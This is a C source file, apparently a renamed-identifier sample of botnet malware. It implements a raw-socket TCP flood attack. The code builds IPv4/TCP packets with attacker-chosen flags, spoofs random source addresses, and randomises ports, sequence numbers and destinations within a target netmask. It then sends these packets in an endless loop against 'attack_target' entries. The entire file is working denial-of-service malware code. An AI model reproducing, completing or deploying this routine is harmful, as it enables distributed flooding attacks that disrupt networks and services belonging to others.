
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int uint8_t ;
typedef int uint32_t ;
typedef int uint16_t ;
struct tcphdr {int source; int dest; int seq; int doff; int psh; int window; int ack_seq; scalar_t__ check; void* fin; void* syn; void* rst; void* ack; void* urg; } ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int version; int ihl; int tos; int id; int ttl; int saddr; scalar_t__ check; int daddr; int protocol; void* frag_off; void* tot_len; } ;
struct TYPE_2__ {int sin_port; } ;
struct attack_target {int netmask; TYPE_1__ sock_addr; int addr; } ;
struct attack_option {int dummy; } ;
typedef int port_t ;
typedef void* BOOL ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int VAR_11 ;
 int VAR_12 ;
 int VAR_13 ;
 int VAR_14 ;
 int VAR_15 ;
 int VAR_16 ;
 int VAR_17 ;
 int VAR_18 ;
 int VAR_19 ;
 int VAR_20 ;
 int VAR_21 ;
 int VAR_22 ;
 int VAR_23 ;
 int VAR_24 ;
 int VAR_25 ;
 void* FUNC_0 (int,struct attack_option*,int ,int) ;
 int FUNC_1 (int,struct attack_option*,int ,int ) ;
 void* FUNC_2 (int,int) ;
 scalar_t__ FUNC_3 (int*,int) ;
 scalar_t__ FUNC_4 (struct iphdr*,struct tcphdr*,void*,int) ;
 int FUNC_5 (int) ;
 scalar_t__ VAR_26 ;
 int FUNC_6 (scalar_t__) ;
 void* FUNC_7 (int) ;
 scalar_t__ FUNC_8 (int ) ;
 int FUNC_9 (char*,...) ;
 int FUNC_10 () ;
 int FUNC_11 (char*,int) ;
 int FUNC_12 (int,char*,int,int ,struct sockaddr*,int) ;
 int FUNC_13 (int,int ,int ,int*,int) ;
 int FUNC_14 (int ,int ,int ) ;

void FUNC_15(uint8_t VAR_27, struct attack_target *VAR_28, uint8_t VAR_29, struct attack_option *VAR_30)
{
    int VAR_31, VAR_32;
    char **VAR_33 = FUNC_2(VAR_27, sizeof (char *));
    uint8_t VAR_34 = FUNC_0(VAR_29, VAR_30, VAR_7, 0);
    uint16_t VAR_35 = FUNC_0(VAR_29, VAR_30, VAR_6, 0xffff);
    uint8_t VAR_36 = FUNC_0(VAR_29, VAR_30, VAR_8, 64);
    BOOL VAR_37 = FUNC_0(VAR_29, VAR_30, VAR_5, VAR_18);
    port_t VAR_38 = FUNC_0(VAR_29, VAR_30, VAR_15, 0xffff);
    port_t VAR_39 = FUNC_0(VAR_29, VAR_30, VAR_3, 0xffff);
    uint32_t VAR_40 = FUNC_0(VAR_29, VAR_30, VAR_13, 0xffff);
    uint32_t VAR_41 = FUNC_0(VAR_29, VAR_30, VAR_2, 0xffff);
    BOOL VAR_42 = FUNC_0(VAR_29, VAR_30, VAR_17, VAR_18);
    BOOL VAR_43 = FUNC_0(VAR_29, VAR_30, VAR_1, VAR_25);
    BOOL VAR_44 = FUNC_0(VAR_29, VAR_30, VAR_11, VAR_18);
    BOOL VAR_45 = FUNC_0(VAR_29, VAR_30, VAR_12, VAR_18);
    BOOL VAR_46 = FUNC_0(VAR_29, VAR_30, VAR_16, VAR_18);
    BOOL VAR_47 = FUNC_0(VAR_29, VAR_30, VAR_4, VAR_18);
    int VAR_48 = FUNC_0(VAR_29, VAR_30, VAR_10, 512);
    BOOL VAR_49 = FUNC_0(VAR_29, VAR_30, VAR_9, VAR_25);
    uint32_t VAR_50 = FUNC_1(VAR_29, VAR_30, VAR_14, VAR_22);

    if ((VAR_32 = FUNC_14(VAR_0, VAR_24, VAR_20)) == -1)
    {



        return;
    }
    VAR_31 = 1;
    if (FUNC_13(VAR_32, VAR_19, VAR_21, &VAR_31, sizeof (int)) == -1)
    {



        FUNC_5(VAR_32);
        return;
    }

    for (VAR_31 = 0; VAR_31 < VAR_27; VAR_31++)
    {
        struct iphdr *VAR_51;
        struct tcphdr *VAR_52;
        char *VAR_53;

        VAR_33[VAR_31] = FUNC_2(1510, sizeof (char));
        VAR_51 = (struct iphdr *)VAR_33[VAR_31];
        VAR_52 = (struct tcphdr *)(VAR_51 + 1);
        VAR_53 = (char *)(VAR_52 + 1);

        VAR_51->version = 4;
        VAR_51->ihl = 5;
        VAR_51->tos = VAR_34;
        VAR_51->tot_len = FUNC_7(sizeof (struct iphdr) + sizeof (struct tcphdr) + VAR_48);
        VAR_51->id = FUNC_7(VAR_35);
        VAR_51->ttl = VAR_36;
        if (VAR_37)
            VAR_51->frag_off = FUNC_7(1 << 14);
        VAR_51->protocol = VAR_20;
        VAR_51->saddr = VAR_50;
        VAR_51->daddr = VAR_28[VAR_31].addr;

        VAR_52->source = FUNC_7(VAR_38);
        VAR_52->dest = FUNC_7(VAR_39);
        VAR_52->seq = FUNC_7(VAR_40);
        VAR_52->doff = 5;
        VAR_52->urg = VAR_42;
        VAR_52->ack = VAR_43;
        VAR_52->psh = VAR_44;
        VAR_52->rst = VAR_45;
        VAR_52->syn = VAR_46;
        VAR_52->fin = VAR_47;
        VAR_52->window = FUNC_10() & 0xffff;
        if (VAR_44)
            VAR_52->psh = VAR_25;

        FUNC_11(VAR_53, VAR_48);
    }







    while (VAR_25)
    {
        for (VAR_31 = 0; VAR_31 < VAR_27; VAR_31++)
        {
            char *VAR_54 = VAR_33[VAR_31];
            struct iphdr *VAR_55 = (struct iphdr *)VAR_54;
            struct tcphdr *VAR_56 = (struct tcphdr *)(VAR_55 + 1);
            char *VAR_57 = (char *)(VAR_56 + 1);


            if (VAR_28[VAR_31].netmask < 32)
                VAR_55->daddr = FUNC_6(FUNC_8(VAR_28[VAR_31].addr) + (((uint32_t)FUNC_10()) >> VAR_28[VAR_31].netmask));

            if (VAR_50 == 0xffffffff)
                VAR_55->saddr = FUNC_10();
            if (VAR_35 == 0xffff)
                VAR_55->id = FUNC_10() & 0xffff;
            if (VAR_38 == 0xffff)
                VAR_56->source = FUNC_10() & 0xffff;
            if (VAR_39 == 0xffff)
                VAR_56->dest = FUNC_10() & 0xffff;
            if (VAR_40 == 0xffff)
                VAR_56->seq = FUNC_10();
            if (VAR_41 == 0xffff)
                VAR_56->ack_seq = FUNC_10();


            if (VAR_49)
                FUNC_11(VAR_57, VAR_48);

            VAR_55->check = 0;
            VAR_55->check = FUNC_3((uint16_t *)VAR_55, sizeof (struct iphdr));

            VAR_56->check = 0;
            VAR_56->check = FUNC_4(VAR_55, VAR_56, FUNC_7(sizeof (struct tcphdr) + VAR_48), sizeof (struct tcphdr) + VAR_48);

            VAR_28[VAR_31].sock_addr.sin_port = VAR_56->dest;
            FUNC_12(VAR_32, VAR_54, sizeof (struct iphdr) + sizeof (struct tcphdr) + VAR_48, VAR_23, (struct sockaddr *)&VAR_28[VAR_31].sock_addr, sizeof (struct sockaddr_in));
        }





    }
}
